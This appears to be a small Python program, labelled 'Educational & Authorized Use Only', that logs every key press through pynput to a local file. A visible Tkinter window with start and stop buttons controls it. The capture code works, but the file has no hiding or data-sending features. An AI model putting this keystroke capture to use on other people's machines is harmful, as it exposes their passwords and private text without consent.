from pynput import keyboard
import tkinter as tk
from datetime import datetime

listener = None
is_logging = False
log_file = "cyrax_keylog.txt"

def write_log(key):
    with open(log_file, "a", encoding="utf-8") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f" [{key}] ")

def on_press(key):
    if is_logging:
        write_log(key)

def start_logging():
    global listener, is_logging
    if not is_logging:
        is_logging = True
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"\n\n--- Cyrax Logging Started: {datetime.now()} ---\n")
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        status_label.config(text="Status: Logging Started", fg="green")

def stop_logging():
    global listener, is_logging
    if is_logging:
        is_logging = False
        if listener:
            listener.stop()
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"\n--- Cyrax Logging Stopped: {datetime.now()} ---\n")
        status_label.config(text="Status: Logging Stopped", fg="red")

# GUI
root = tk.Tk()
root.title("Cyrax Key Logger")
root.geometry("360x220")
root.resizable(False, False)

title_label = tk.Label(
    root,
    text="Cyrax Key Logger",
    font=("Arial", 14, "bold")
)
title_label.pack(pady=10)

subtitle = tk.Label(
    root,
    text="Educational & Authorized Use Only",
    font=("Arial", 9),
    fg="gray"
)
subtitle.pack()

status_label = tk.Label(root, text="Status: Not Logging", fg="blue")
status_label.pack(pady=8)

start_btn = tk.Button(
    root, text="Start Logging",
    command=start_logging, width=22,
    bg="green", fg="white"
)
start_btn.pack(pady=5)

stop_btn = tk.Button(
    root, text="Stop Logging",
    command=stop_logging, width=22,
    bg="red", fg="white"
)
stop_btn.pack(pady=5)

note = tk.Label(
    root,
    text="Logs saved to: cyrax_keylog.txt",
    font=("Arial", 9),
    fg="gray"
)
note.pack(pady=10)

root.mainloop()
